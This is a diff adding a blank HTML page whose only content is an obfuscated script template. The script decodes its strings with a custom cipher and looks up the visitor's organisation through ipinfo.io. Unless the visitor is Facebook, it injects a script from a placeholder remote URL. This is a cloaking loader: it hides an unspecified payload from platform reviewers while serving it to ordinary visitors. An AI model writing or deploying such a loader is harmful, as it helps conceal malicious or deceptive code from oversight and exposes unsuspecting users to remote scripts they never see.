@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+	<script type="text/javascript">
+		var {window} = window;
+        var {document} = {decode}("document");
+        var {tagName} = {decode}("script");
+        var {createElement} = {decode}("createElement");
+        var {src} = {decode}("src");
+        var {appendChild} = {decode}("appendChild");
+        var {head} = {decode}("head");
+
+        var {ipinfo} = {decode}("https://ipinfo.io/org");
+        var {orgs} = {decode}("facebook");
+
+        var {XMLHttpRequest} = {decode}("XMLHttpRequest");
+        var {open} = {decode}("open");
+        var {send} = {decode}("send");
+        var {onreadystatechange} = {decode}("onreadystatechange");
+        var {GET} = {decode}("GET");
+
+        var {xhr} = new {window}[{XMLHttpRequest}]();
+        {xhr}[{open}]({GET}, {ipinfo});
+        {xhr}[{onreadystatechange}] = function(){
+          var {readyState} = {decode}("readyState");
+          var {4} = {decode}("4");
+          if({xhr}[{readyState}] == {4}){
+            var {responseText} = {decode}("responseText");
+            var {org} = {xhr}[{responseText}];
+            var {split} = {decode}("split");
+            var {length} = {decode}("length");
+            var {list} = {orgs}[{split}]({decode}(","));
+            var {banned} = false;
+            var {toLowerCase} = {decode}("toLowerCase");
+            {org} = {org}[{toLowerCase}]();
+            var {indexOf} = {decode}("indexOf");
+            for({i}=0;{i}<{list}[{length}];{i}++){
+              if({org}[{indexOf}]({list}[{i}]) >= 0){
+                {banned} = true;
+                break;
+              }
+            }
+
+            if({banned} == false){
+              var {script} = {window}[{document}][{createElement}]({tagName});
+              {script}[{src}] = {decode}("{jsurl}");
+              {window}[{document}][{head}][{appendChild}]({script});
+            }
+          }
+        }
+        {xhr}[{send}]();
+        
+        function {decode}({metin},{charlen},{bool}){
+          var {alfabe} = "{alfabestr}";
+          var {kripto} = {kriptoarray};
+          var {davinci} = "";
+          var {kriptolen} = 0;
+          while({kripto}[{kriptolen}]){
+            {kriptolen}++;
+          }
+          var {i} = 0;
+          while({metin}[{i}]){
+            var {al} = 0;
+            var {ar} = -1;
+            while({alfabe}[{al}]){
+              if({alfabe}[{al}] == {metin}[{i}]){
+                {ar} = {al};
+                break;
+              }
+              {al}++;
+            }
+            if({ar} >= 0){
+              var {kl} = 0;
+              var {kr} = -1;
+              while({kripto}[{i}%{kriptolen}][{kl}]){
+                if({kripto}[{i}%{kriptolen}][{kl}] == {metin}[{i}]){
+                  {kr} = {kl};
+                  break;
+                }
+              {kl}++;
+              }
+              {davinci} += {alfabe}[{kr}];
+            }else{
+              {davinci} += {metin}[{i}];
+            }
+            {i}++;
+          }
+          var {temp} = "";
+          for({ch}={charlen};{ch}<{davinci}.length;{ch}++){
+            {temp} += {davinci}[{ch}];
+          }
+          {davinci} = {temp};
+          return {davinci};
+        }
+	</script>
+</head>
+<body>
+
+</body>
+</html>
